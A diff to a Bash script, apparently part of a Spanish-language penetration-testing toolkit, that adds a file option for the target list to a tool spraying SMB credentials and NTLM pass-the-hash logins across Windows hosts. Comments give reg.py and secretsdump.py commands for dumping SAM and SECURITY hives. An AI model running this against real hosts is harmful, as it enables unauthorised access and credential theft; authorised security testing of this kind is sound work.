@@ -9,12 +9,13 @@ RESET='\e[0m'
 
 #iptables -I INPUT -p icmp --icmp-type 8 -j DROP
 
-while getopts ":u:h:p:f:o:" OPTIONS
+while getopts ":u:h:p:f:" OPTIONS
 do
             case $OPTIONS in            
             u)     USUARIO=$OPTARG;;
             h)     HASH=$OPTARG;;
-            p)     PASSWORD=$OPTARG;;                    
+            p)     PASSWORD=$OPTARG;;
+			f)     FILE=$OPTARG;;
             ?)     printf "Opcion invalida: -$OPTARG\n" $0
                           exit 2;;
            esac
@@ -23,6 +24,7 @@ done
 USUARIO=${USUARIO:=NULL}
 HASH=${HASH:=NULL}
 PASSWORD=${PASSWORD:=NULL}
+FILE=${FILE:=NULL}
 
 function insert_data () {
 	find .vulnerabilidades -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
@@ -52,7 +54,7 @@ MIN_RAM=900;
 MAX_SCRIPT_INSTANCES=15
 if [ $USUARIO = NULL ] ; then
 echo "|              														 			"
-echo "| USO: local-admin-checker.sh -u [usuario] -h [hash] -p [password]"
+echo "| USO: local-admin-checker.sh -u [usuario] -h [hash] -p [password] -f [file]"
 echo "|																		 			"
 echo ""
 exit
@@ -64,7 +66,7 @@ fi
 #   reg.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SECURITY' -o '\\192.168.56.132\share'
 #3) secretsdump.py -sam SAM.save -system SYSTEM.save LOCAL
 #   secretsdump -security SECURITY.save -system SYSTEM.save LOCAL # DCC2 (Domain Cached credentials 2 ) hashcat mode 2100
-echo -e "$OKBLUE  USUARIO:$USUARIO HASH:$HASH PASSWORD:$PASSWORD $RESET"
+echo -e "$OKBLUE  USUARIO:$USUARIO HASH:$HASH PASSWORD:$PASSWORD FILE $FILE $RESET"
 
 function checkRAM (){
 	while true; do
@@ -83,7 +85,7 @@ function checkRAM (){
 }
 ######################
 
-  for ip in $(cat servicios/Windows.txt); do
+  for ip in $(cat $FILE); do
 			echo -e "[+] $OKBLUE Testeando $ip .. $RESET"
 			if [ "$PASSWORD" != NULL ] ; then
 			#echo "PASSWORD $PASSWORD"				
@@ -110,7 +112,7 @@ function checkRAM (){
 		fi
 	done	# done true	
 
-	for ip in $(cat servicios/Windows.txt); do		
+	for ip in $(cat $FILE); do		
 			grep -qai '+' logs/cracking/"$ip"_smb_passwordAdivinadoWin1.txt 2>/dev/null
 			greprc=$?
 			if [[ $greprc -eq 0 ]] ; then						
@@ -120,7 +122,7 @@ function checkRAM (){
 				else
 					echo -e "Usuario:$USUARIO Hash:aad3b435b51404eeaad3b435b51404ee:$HASH (local)" >> .vulnerabilidades/"$ip"_smb_passwordAdivinadoWin.txt
 				fi
-			sed -i "/$ip/d" servicios/Windows.txt #borrar de la lista
+			sed -i "/$ip/d" $FILE #borrar de la lista
 			exit		
 			fi	
 
@@ -133,7 +135,7 @@ function checkRAM (){
 				else
 					echo -e "Usuario:$USUARIO Hash:aad3b435b51404eeaad3b435b51404ee:$HASH (dominio)" >> .vulnerabilidades/"$ip"_smb_passwordAdivinadoWin.txt
 				fi	
-			sed -i "/$ip/d" servicios/Windows.txt #borrar de la lista
+			sed -i "/$ip/d" $FILE #borrar de la lista
 			exit		
 			fi	
 	done	
